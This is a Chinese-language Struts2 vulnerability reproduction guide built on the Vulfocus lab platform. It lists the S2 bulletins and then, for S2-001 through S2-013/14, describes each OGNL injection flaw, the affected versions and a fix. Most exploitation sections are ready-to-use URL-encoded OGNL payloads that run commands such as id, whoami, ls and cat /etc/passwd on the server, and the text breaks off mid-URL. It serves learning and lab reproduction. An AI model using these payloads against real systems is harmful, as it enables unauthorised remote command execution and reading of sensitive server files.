**以下漏洞复现环境为Vulfocus平台搭建的环境**

* [0x01 Struts2\-001远程代码执行漏洞(CVE\-2007\-4556)](#0x01-struts2-001远程代码执行漏洞cve-2007-4556)
  * [漏洞简介](#漏洞简介)
  * [影响版本](#影响版本)
  * [利用过程](#利用过程)
    * [漏洞利用代码](#漏洞利用代码)
  * [漏洞建议](#漏洞建议)
* [0x02 Struts2\-005远程代码执行漏洞(CVE\-2010\-1870)](#0x02-struts2-005远程代码执行漏洞cve-2010-1870)
  * [漏洞简介](#漏洞简介-1)
  * [影响版本](#影响版本-1)
  * [利用过程](#利用过程-1)
    * [漏洞利用代码(无回显)](#漏洞利用代码无回显)
    * [漏洞利用代码(有回显)](#漏洞利用代码有回显)
  * [漏洞修复](#漏洞修复)
* [0x03 Struts2\-007远程代码执行漏洞(CVE\-2012\-0838)](#0x03-struts2-007远程代码执行漏洞cve-2012-0838)
  * [漏洞简介](#漏洞简介-2)
  * [影响版本](#影响版本-2)
  * [利用过程](#利用过程-2)
    * [漏洞利用代码](#漏洞利用代码-1)
  * [漏洞修复](#漏洞修复-1)
* [0x04 Struts2\-008远程代码执行漏洞(CVE\-2012\-0392)](#0x04-struts2-008远程代码执行漏洞cve-2012-0392)
  * [漏洞简介](#漏洞简介-3)
  * [影响版本](#影响版本-3)
  * [利用过程](#利用过程-3)
    * [漏洞利用代码](#漏洞利用代码-2)
  * [漏洞修复](#漏洞修复-2)
* [0x05 Struts2\-009远程代码执行漏洞(CVE\-2011\-3923)](#0x05-struts2-009远程代码执行漏洞cve-2011-3923)
  * [漏洞简介](#漏洞简介-4)
  * [影响版本](#影响版本-4)
  * [利用过程](#利用过程-4)
  * [漏洞利用代码](#漏洞利用代码-3)
  * [漏洞修复](#漏洞修复-3)
* [0x06 Struts2\-012远程代码执行漏洞(CVE\-2013\-1965)](#0x06-struts2-012远程代码执行漏洞cve-2013-1965)
  * [漏洞简介](#漏洞简介-5)
  * [影响版本](#影响版本-5)
  * [利用过程](#利用过程-5)
    * [漏洞利用代码](#漏洞利用代码-4)
  * [漏洞修复](#漏洞修复-4)
* [0x07 Struts2\-013/14远程代码执行漏洞(CVE\-2013\-1966/CVE\-2013\-2115)](#0x07-struts2-01314远程代码执行漏洞cve-2013-1966cve-2013-2115)
  * [漏洞简介](#漏洞简介-6)
  * [影响版本](#影响版本-6)
  * [利用过程](#利用过程-6)
    * [漏洞利用代码](#漏洞利用代码-5)
  * [漏洞修复](#漏洞修复-5)
* [0x08 Struts2\-015远程代码执行漏洞(CVE\-2013\-2135, CVE\-2013\-2134)](#0x08-struts2-015远程代码执行漏洞cve-2013-2135-cve-2013-2134)
  * [漏洞简介](#漏洞简介-7)
  * [影响版本](#影响版本-7)
  * [利用过程](#利用过程-7)
    * [漏洞利用代码](#漏洞利用代码-6)
  * [漏洞修复](#漏洞修复-6)
* [0x09 Struts2\-016远程代码执行漏洞(CVE\-2013\-2251)](#0x09-struts2-016远程代码执行漏洞cve-2013-2251)
  * [漏洞简介](#漏洞简介-8)
  * [影响版本](#影响版本-8)
  * [利用过程](#利用过程-8)
    * [漏洞利用代码](#漏洞利用代码-7)
  * [漏洞修复](#漏洞修复-7)
* [0x10 Sturts2\-032远程代码执行漏洞(CVE\-2016\-3081)](#0x10-sturts2-032远程代码执行漏洞cve-2016-3081)
  * [漏洞简介](#漏洞简介-9)
  * [影响版本](#影响版本-9)
  * [利用过程](#利用过程-9)
    * [漏洞利用代码](#漏洞利用代码-8)
  * [漏洞修复](#漏洞修复-8)
* [0x11 Struts2\-045远程代码执行漏洞(CVE\-2017\-5638)](#0x11-struts2-045远程代码执行漏洞cve-2017-5638)
  * [漏洞简介](#漏洞简介-10)
  * [影响版本](#影响版本-10)
  * [利用过程](#利用过程-10)
    * [利用代码](#利用代码)
    * [Python漏洞验证脚本](#python漏洞验证脚本)
    * [Python漏洞利用脚本](#python漏洞利用脚本)
  * [漏洞修复](#漏洞修复-9)
* [0x12 Struts2\-046远程代码执行漏洞（CVE\-2017\-5638）](#0x12-struts2-046远程代码执行漏洞cve-2017-5638)
  * [漏洞简介](#漏洞简介-11)
  * [影响版本](#影响版本-11)
  * [利用过程](#利用过程-11)
    * [漏洞利用代码](#漏洞利用代码-9)
    * [Python漏洞验证脚本](#python漏洞验证脚本-1)
    * [Python漏洞利用脚本](#python漏洞利用脚本-1)
  * [漏洞修复](#漏洞修复-10)
* [0x013 struts2\-048 远程代码执行(CVE\-2017\-9791）](#0x013-struts2-048-远程代码执行cve-2017-9791)
  * [漏洞简介](#漏洞简介-12)
  * [影响版本](#影响版本-12)
  * [利用过程](#利用过程-12)
    * [漏洞利用代码1](#漏洞利用代码1)
    * [漏洞利用代码2](#漏洞利用代码2)
    * [Python漏洞验证脚本](#python漏洞验证脚本-2)
    * [Python漏洞利用脚本](#python漏洞利用脚本-2)
  * [漏洞修复](#漏洞修复-11)
* [0x014 Struts2\-052远程代码执行漏洞(CVE\-2017\-9805)](#0x014-struts2-052远程代码执行漏洞cve-2017-9805)
  * [漏洞简介](#漏洞简介-13)
  * [影响版本](#影响版本-13)
  * [利用过程](#利用过程-13)
    * [Python漏洞验证代码](#python漏洞验证代码)
    * [Python漏洞利用代码(无回显执行命令)](#python漏洞利用代码无回显执行命令)
  * [漏洞修复](#漏洞修复-12)
* [0x015 Struts2\-053远程代码执行漏洞(CVE\-2017\-12611)](#0x015-struts2-053远程代码执行漏洞cve-2017-12611)
  * [漏洞简介](#漏洞简介-14)
  * [影响版本](#影响版本-14)
  * [利用过程](#利用过程-14)
    * [漏洞利用代码](#漏洞利用代码-10)
    * [Python漏洞验证代码](#python漏洞验证代码-1)
    * [Python漏洞利用代码](#python漏洞利用代码)
  * [漏洞修复](#漏洞修复-13)
* [0x016 Struts2\-057远程代码执行漏洞 (CVE\-2018\-11776)](#0x016-struts2-057远程代码执行漏洞-cve-2018-11776)
  * [漏洞简介](#漏洞简介-15)
  * [影响版本](#影响版本-15)
  * [利用过程](#利用过程-15)
    * [漏洞利用代码](#漏洞利用代码-11)
    * [Payload漏洞验证脚本](#payload漏洞验证脚本)
    * [Python漏洞利用脚本](#python漏洞利用脚本-3)
  * [漏洞修复](#漏洞修复-14)
* [0x017 Struts2\-059远程代码执行(CVE\-2019\-0230)](#0x017-struts2-059远程代码执行cve-2019-0230)
  * [漏洞简介](#漏洞简介-16)
  * [影响版本](#影响版本-16)
  * [利用过程](#利用过程-16)
    * [漏洞利用代码](#漏洞利用代码-12)
    * [Python漏洞验证脚本](#python漏洞验证脚本-3)
    * [Python漏洞攻击脚本](#python漏洞攻击脚本)
  * [漏洞修复](#漏洞修复-15)
* [0x018 Struts2\-061远程代码执行(CVE\-2020\-17530)](#0x018-struts2-061远程代码执行cve-2020-17530)
  * [漏洞简介](#漏洞简介-17)
  * [影响版本](#影响版本-17)
  * [利用过程](#利用过程-17)
    * [漏洞利用代码](#漏洞利用代码-13)
    * [Python漏洞验证脚本](#python漏洞验证脚本-4)
    * [Python漏洞利用脚本](#python漏洞利用脚本-4)
  * [漏洞修复](#漏洞修复-16)

Struts2漏洞编码

```php
S2-001(CVE-2007-4556) - 远程代码利用表单验证错误
S2-002（无CVE） - <s：url>和<s：a>标记上的跨站点脚本（XSS）漏洞
S2-003（无CVE） - XWork ParameterInterceptors旁路允许OGNL语句执行
S2-004（无CVE） - 提供静态内容时的目录遍历漏洞
S2-005(CVE-2010-1870) - XWork ParameterInterceptors旁路允许远程命令执行
S2-006(CVE-2011-1772) - XWork中的多个跨站点脚本（XSS）生成错误页面
S2-007(CVE-2012-0838) - 当出现转换错误时，用户输入被评估为OGNL表达式
S2-008(CVE-2012-0392) - Struts2中的多个关键漏洞
S2-009(CVE-2011-3923) - ParameterInterceptor漏洞允许远程命令执行
S2-010(CVE-2012-4386) - 当使用Struts 2令牌机制进行CSRF保护时，可能会因滥用已知会话属性而绕过令牌检查
S2-011(CVE-2012-4387) - 长请求参数名称可能会显着提高DOS攻击的有效性
S2-012(CVE-2013-1965) - 展示应用程序漏洞允许远程命令执行
S2-013(CVE-2013-1966) - URL和锚标记的includeParams属性中存在的漏洞允许远程命令执行
S2-014(CVE-2013-2115) - 强制参数包含在URL和锚标记中引入的漏洞允许远程命令执行，会话访问和操作以及XSS攻击
S2-015(CVE-2013-2135, CVE-2013-2134) - 通配符匹配机制引入的漏洞或OGNL表达式的双重评估允许远程命令执行。
S2-016(CVE-2013-2251) - 通过操作前缀为“action：”/“redirect：”/“redirectAction：”的参数引入的漏洞允许远程命令执行
S2-017(CVE-2013-2248) - 通过操作前缀为“redirect：”/“redirectAction：”的参数引入的漏洞允许打开重定向
S2-018(CVE-2013-4310) - Apache Struts2中的访问控制漏洞
S2-019(CVE-2013-4316) - 默认情况下禁用动态方法调用
S2-020(CVE-2014-0050、CVE-2014-0094) - 将Commons FileUpload升级到版本1.3.1（避免DoS攻击）并添加’class’以排除ParametersInterceptor中的params（避免ClassLoader操作）
S2-021(CVE-2014-0112,CVE-2014-0113) - 改进了ParametersInterceptor和CookieInterceptor中被排除的参数，以避免ClassLoader操作
S2-022(CVE-2014-0116) - 在CookieInterceptor中扩展排除的params以避免操纵Struts的内部
S2-023(CVE-2014-7809) - 令牌的生成值可以预测
S2-024(CVE-2015-1831) - 错误的excludeParams会覆盖DefaultExcludedPatternsChecker中定义的那些
S2-025(CVE-2015-5169) - 调试模式和公开的JSP文件中的跨站点脚本漏洞
S2-026(CVE-2015-5209) - 特殊顶级对象可用于访问Struts的内部
S2-027(CVE-2016-3090) - TextParseUtil.translateVariables不过滤恶意OGNL表达式
S2-028(CVE-2016-4003) - 使用具有损坏的URLDecoder实现的JRE可能会导致基于Struts 2的Web应用程序中的XSS漏洞。
S2-029(CVE-2016-0785) - 在标记属性中对原始用户输入进行评估时，强制双OGNL评估可能导致远程代码执行。
S2-030(CVE-2016-2162) - I18NInterceptor中可能的XSS漏洞
S2-031(CVE-2016-3082) - XSLTResult可用于解析任意样式表
S2-032(CVE-2016-3081) - 启用动态方法调用时，可以通过方法：前缀执行远程执行代码。
S2-033(CVE-2016-3087) - 使用REST插件时可以执行远程执行代码！启用动态方法调用时的运算符。
S2-034(CVE-2016-3093) - OGNL缓存中毒可能导致DoS漏洞
S2-035(CVE-2016-4436) - 动作名称清理容易出错
S2-036(CVE-2016-4461) - 在标签属性中对原始用户输入进行评估时，强制双OGNL评估可能导致远程代码执行（类似于S2-029）
S2-037 OR S2-devMode(CVE-2016-4438) - 使用REST插件时可以执行远程执行代码。
S2-038(CVE-2016-4430) - 可以绕过令牌验证并执行CSRF攻击
S2-039(CVE-2016-4433) - Getter作为行动方法导致安全绕过
S2-040(CVE-2016-4431) - 使用现有默认操作方法输入验证绕过。
S2-041(CVE-2016-4465) - 使用URLValidator时可能发生DoS攻击
S2-042(CVE-2016-6795) - “公约”插件中可能的路径遍历
S2-043(无CVE) - 在生产中使用Config Browser插件
S2-044(CVE-2016-8738) - 使用URLValidator时可能发生DoS攻击
S2-045(CVE-2017-5638) - 基于Jakarta Multipart解析器执行文件上载时可能的远程执行代码。
S2-046(CVE-2017-5638) - 基于Jakarta Multipart解析器执行文件上传时可能的RCE（类似于S2-045）
S2-047(CVE-2017-7672) - 使用URLValidator时可能发生DoS攻击（类似于S2-044）
S2-048(CVE-2017-9791) - Struts 2.3.x系列中Struts 1插件示例中的Struts Showcase应用程序中可能的RCE
S2-049(CVE-2017-9787) - DoS攻击可用于Spring安全操作
S2-050(CVE-2017-9804) - 使用URLValidator时的正则表达式拒绝服务（类似于S2-044和S2-047）
S2-051(CVE-2017-9793) - 远程攻击者可能在使用Struts REST插件时通过发送精心设计的xml请求来创建DoS攻击
S2-052(CVE-2017-9805) - 使用带有XStream处理程序的Struts REST插件处理XML有效负载时可能发生的远程代码执行攻击
S2-053(CVE-2017-12611) - 在Freemarker标记中使用无意表达而不是字符串文字时可能发生的远程执行代码攻击
S2-054(CVE-2017-15707) - 使用Struts REST插件时，可以使用精心设计的JSON请求执行DoS攻击
S2-055(CVE-2017-7525) - Jackson JSON库中的RCE漏洞
S2-056(CVE-2018-1327) - 使用Struts REST插件时，可以使用精心设计的XML请求执行DoS攻击
S2-057(CVE-2018-11776) - 可能远程执行代码时 alwaysSelectFullNamespace是true（通过用户或类似公约插件的一个插件），然后：结果与没有使用namespace和在同一时间时，其上package没有或通配符namespace和类似的结果，当使用相同的可能性url标签，其不havevalue和actionset 并且同时，它的上边package有 no 或 wildcard namespace。
S2-058(CVE-2008-6504) - 如果使用 Struts 2 的生产系统已更新以修复特定的历史安全问题，并且此后未更新以修复后来记录的安全问题，直到并包括 S2-057，则所述生产系统可能仍然容易受到特定漏洞的影响。这旨在通过采取措施解决，如受影响的历史安全问题公告中所述。
S2-059(CVE-2019-0230) - 当对标签属性中的原始用户输入进行评估时，强制双重 OGNL 评估可能会导致远程代码执行。
S2-060(CVE-2019-0233) - 执行文件上传时访问权限覆盖导致拒绝服务。
S2-061(CVE-2020-17530) - 在对标签属性中的原始用户输入进行评估时，强制 OGNL 评估可能会导致远程代码执行 - 类似于 S2-059。
```
------

## 0x01 Struts2-001远程代码执行漏洞(CVE-2007-4556)
### 漏洞简介
**该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行**
​

### 影响版本
**Struts 2.0.0 - Struts 2.0.8**
​

### 利用过程
#### 漏洞利用代码
**用burpsuite抓包，发送exp执行命令（带参数的命令：）new java.lang.String[]{"cat","/etc/passwd"}：**
```php
%25%7b%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String%5b%5d%7b%22pwd%22%7d)).redirectErrorStream(true).start()%2c%23b%3d%23a.getInputStream()%2c%23c%3dnew%20java.io.InputStreamReader(%23b)%2c%23d%3dnew%20java.io.BufferedReader(%23c)%2c%23e%3dnew%20char%5b50000%5d%2c%23d.read(%23e)%2c%23f%3d%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2c%23f.getWriter().println(new%20java.lang.String(%23e))%2c%23f.getWriter().flush()%2c%23f.getWriter().close()%7d%20
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636627128903-1f4948aa-57d1-4b12-8d23-a0aeb59c692d.png#clientId=u6c33c8a5-27c9-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=296&id=u8d2b42c9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=592&originWidth=1490&originalType=binary&ratio=1&rotation=0&showTitle=false&size=149699&status=done&style=none&taskId=ud6523439-5cea-48fe-bc2e-c382ca223a5&title=&width=745)
### 漏洞建议
目前厂商已发布漏洞解决方法：
[https://cwiki.apache.org/confluence/display/WW/S2-001](https://cwiki.apache.org/confluence/display/WW/S2-001)
​

------

## 0x02 Struts2-005远程代码执行漏洞(CVE-2010-1870)
### 漏洞简介
**Struts2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，**


### 影响版本
**Apache Struts 2.0.0 - 2.1.8.1**
**​**

### 利用过程
#### 漏洞利用代码(无回显)
```php
/example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1
```
#### 漏洞利用代码(有回显)
```php
/example/HelloWorld.action?(%27%5c43_memberAccess.allowStaticMethodAccess%27)(a)=true&(b)((%27%5c43context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5c75false%27)(b))&(%27%5c43c%27)((%27%5c43_memberAccess.excludeProperties%5c75@java.util.Collections@EMPTY_SET%27)(c))&(g)((%27%5c43mycmd%5c75%5c%27whoami%5c%27%27)(d))&(h)((%27%5c43myret%5c75@java.lang.Runtime@getRuntime().exec(%5c43mycmd)%27)(d))&(i)((%27%5c43mydat%5c75new%5c40java.io.DataInputStream(%5c43myret.getInputStream())%27)(d))&(j)((%27%5c43myres%5c75new%5c40byte[51020]%27)(d))&(k)((%27%5c43mydat.readFully(%5c43myres)%27)(d))&(l)((%27%5c43mystr%5c75new%5c40java.lang.String(%5c43myres)%27)(d))&(m)((%27%5c43myout%5c75@org.apache.struts2.ServletActionContext@getResponse()%27)(d))&(n)((%27%5c43myout.getWriter().println(%5c43mystr)%27)(d))
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636626430047-d7056613-b1ff-4807-94d6-442a0f770501.png#clientId=u6cf5684c-d951-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=284&id=qUXhN&margin=%5Bobject%20Object%5D&name=image.png&originHeight=568&originWidth=1561&originalType=binary&ratio=1&rotation=0&showTitle=false&size=145230&status=done&style=none&taskId=u51ba6795-f492-4928-b712-cf9ebcaa10f&title=&width=780.5)
### 漏洞修复
目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接：
[http://struts.apache.org/2.2.1/docs/s2-005.html](http://struts.apache.org/2.2.1/docs/s2-005.html)
​

------

## 0x03 Struts2-007远程代码执行漏洞(CVE-2012-0838)
### 漏洞简介
当来自于用户传递一个非整数给id导致错误，struts会将用户的输入当作ongl表达式执行，从而导致了漏洞
当<ActionName> -validation.xml配置的验证规则。如果类型验证转换失败，服务器将拼接用户提交的表单值字符串，然后执行OGNL表达式解析并返回。
例如这里是一个UserAction：
```php
(...)
public class UserAction extends ActionSupport {
    private Integer age;
    private String name;
    private String email;

(...)
```
和UserAction-validation.xml配置：
<?xml version="1.0" encoding="UTF-8" ?> <!DOCTYPE validators PUBLIC     "-//OpenSymphony Group//XWork Validator 1.0//EN"     "http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd"> <validators>     <field name="age">         <field-validator type="int">             <param name="min">1</param>             <param name="max">150</param>         </field-validator>     </field> </validators>
当用户提交age为 astr而不是 an 时int，服务器"'" + value + "'"与代码进行拼接，然后使用 OGNL 表达式对其进行解析。为了使exploot成功，我们需要找到一个配置了类似验证规则的表单字段来进行转换错误。然后你可以像注入SQL单引号一样注入任何OGNL表达式代码。
### 影响版本
**Apache Struts2 2.0.0 - 2.2.3**


### 利用过程
#### 漏洞利用代码
这是可以执行任意代码的 EXP：
```php
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '
```
将EXP放入输入框（age），然后得到命令执行结果：
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636628915552-b850a5c6-d5f7-4199-819f-f44903d16693.png#clientId=u6c33c8a5-27c9-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=349&id=u22e96b17&margin=%5Bobject%20Object%5D&name=image.png&originHeight=697&originWidth=1599&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74099&status=done&style=none&taskId=uf2eb68b2-c3c1-4259-9f39-5504da564ee&title=&width=799.5)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636628926956-bd1e3b38-0795-477e-a508-ea9415f165a9.png#clientId=u6c33c8a5-27c9-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=331&id=u7fd6eced&margin=%5Bobject%20Object%5D&name=image.png&originHeight=662&originWidth=1722&originalType=binary&ratio=1&rotation=0&showTitle=false&size=77919&status=done&style=none&taskId=u60db0d18-6cfe-45e9-92a6-fcb5b5c0bb6&title=&width=861)


### 漏洞修复
**建议升级Struts2到最新版本**

------


## 0x04 Struts2-008远程代码执行漏洞(CVE-2012-0392)
### 漏洞简介
参考 [http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html](https://link.wangan.com/check?link=http%3A%2F%2Frickgray.me%2F2016%2F05%2F06%2Freview-struts2-remote-command-execution-vulnerabilities.html)
**S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。**
[

](https://blog.csdn.net/god_zzZ/article/details/94398559)
### 影响版本
**Apache Struts 2.0.0 - Struts2 2.3.17**
​

### 利用过程
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636628504101-5c7b1bb4-b057-451e-b12f-e2ccf107da79.png#clientId=u6c33c8a5-27c9-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=329&id=u969be015&margin=%5Bobject%20Object%5D&name=image.png&originHeight=658&originWidth=1650&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75443&status=done&style=none&taskId=ua14e6ef7-38ee-4e2d-993f-77ea1716891&title=&width=825)
#### 漏洞利用代码
在?debug=command&expression=<OGNL EXP>在devModemode中加入参数，OGNL表达式会直接执行，可以执行命令：
```php
http://192.168.0.1:10120/devmode.action?debug=command&expression=%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ls%27%29.getInputStream%28%29%29%29
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636628485979-8d4c3127-df86-4210-8f48-300b85a39c42.png#clientId=u6c33c8a5-27c9-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=315&id=uf49a50c3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=630&originWidth=1571&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69203&status=done&style=none&taskId=uf1b5e001-2605-4d4a-9b07-d72d4d6b049&title=&width=785.5)


### 漏洞修复
**强烈建议升级到**[Struts 2.3.18](http://struts.apache.org/download.cgi#struts2311)** 或更高版本，其中包含更正的类。**

------


## 0x05 Struts2-009远程代码执行漏洞(CVE-2011-3923)
### 漏洞简介
**2.3.1.2 之前的 Apache Struts 允许远程攻击者绕过 ParameterInterceptor 类中的安全保护并执行任意命令。**
**此漏洞源自 s2-003、s2-005。如果想了解漏洞原理，需要阅读s2-005的说明：**
[https](https://github.com/phith0n/vulhub/blob/master/struts2/s2-005/README.md)** : **[//github.com/phith0n/vulhub/blob/master/struts2/s2-005/README.md](https://github.com/phith0n/vulhub/blob/master/struts2/s2-005/README.md)
[Struts2漏洞分析](https://www.t00ls.net/viewthread.php?tid=21197)**，如文章所述，引入OGNL的方法可能不仅出现在这个漏洞中，也可能出现在其他Java应用中。**
**Struts2对s2-003的修复方法是禁止静态方法调用。在 s2-005 中，可以直接通过 OGNL 绕过此限制。对于#号码，使用代码\u0023或\43绕过；那么s2-005的修复被禁止\等特殊符号阻止用户提交反斜杠。**
**但是，如果example当前操作中接受了一个参数，则该参数将被发送到 OGNL 表达式。所以，我们可以把OGNL的表达式代码放在example参数中，然后执行/helloword.acton?example=<OGNL statement>&(example)('xxx')=1，然后绕过特殊字符的防御，比如#，\。**
​

### 影响版本
**Apache Struts 2.1.0 - 2.3.1.1**
**​**

### 利用过程
### 漏洞利用代码
```php
http://192.168.0.1:50351/ajax/example5.action?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27id%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636625718918-be93d3b2-aaaf-4826-8d28-3b5521052290.png#clientId=u817b6f0d-b5e3-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=230&id=u01dba57b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=460&originWidth=1230&originalType=binary&ratio=1&rotation=0&showTitle=false&size=105511&status=done&style=none&taskId=u5528cfa1-33c1-43bf-8dee-439f066850b&title=&width=615)




### 漏洞修复
目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
[http://struts.apache.org/download.cgi#struts2312](http://struts.apache.org/download.cgi#struts2312)
​

------

## 0x06 Struts2-012远程代码执行漏洞(CVE-2013-1965)
### 漏洞简介
配置如果使用重定向类型时result在action，和$ {PARAM_NAME}也被用作重定向变量，例如：
```php
<package name="S2-012" extends="struts-default">
    <action name="user" class="com.demo.action.UserAction">
        <result name="redirect" type="redirect">/index.jsp?name=${name}</result>
        <result name="input">/index.jsp</result>
        <result name="success">/index.jsp</result>
    </action>
</package>
```
在重定向过程中，struts2对name参数的值进行OGNL表达式解析，从而插入OGNL表达式导致命令执行。


### 影响版本
**Apache Struts 2.1.0 - Apache Struts 2.3.13**
**​**

### 利用过程
#### 漏洞利用代码
```php
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat", "/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636629933572-c816303b-d9d4-4452-bbf8-49795d06d454.png#clientId=u6c33c8a5-27c9-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=287&id=uc29b6103&margin=%5Bobject%20Object%5D&name=image.png&originHeight=573&originWidth=1551&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60488&status=done&style=none&taskId=uc95f7db3-7a65-4775-8eaa-a75627d3062&title=&width=775.5)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636629944712-1b6b6759-c98c-408c-b320-bd7efe5aad5b.png#clientId=u6c33c8a5-27c9-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=415&id=u3cea121b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=830&originWidth=1500&originalType=binary&ratio=1&rotation=0&showTitle=false&size=248829&status=done&style=none&taskId=ud1af04ca-b39a-4be5-87dc-4a4e6286048&title=&width=750)
**​**

### 漏洞修复
**建议升级到最新版本**
​

------

## 0x07 Struts2-013/14远程代码执行漏洞(CVE-2013-1966/CVE-2013-2115)
### 漏洞简介
Struts2 的标签<s:a>和<s:url>，提供了一个includeParams 属性。该属性的主要作用是了解是否包含http 请求参数。
includeParams 的允许值为：

1. none - 在 URL 中不包含参数（默认）
1. get - 在 URL 中仅包含 GET 参数
1. all - 在 URL 中包含 GET 和 POST 参数

当 时includeParams=all，此请求的 GET 和 POST 参数放在 URL 的 GET 参数上。在此过程中，参数将被 OGNL 表达式解析。它导致命令执行。
​

### 影响版本
**Apache Struts 2.0.0 - Apache Struts 2.3.14.1**
**​**

### 利用过程
#### 漏洞利用代码
```php
${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}

// 或

${#_memberAccess["allowStaticMethodAccess"]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}
```
[http://192.168.0.1:8050/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27id%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D](http://192.168.0.1:8050/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27id%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C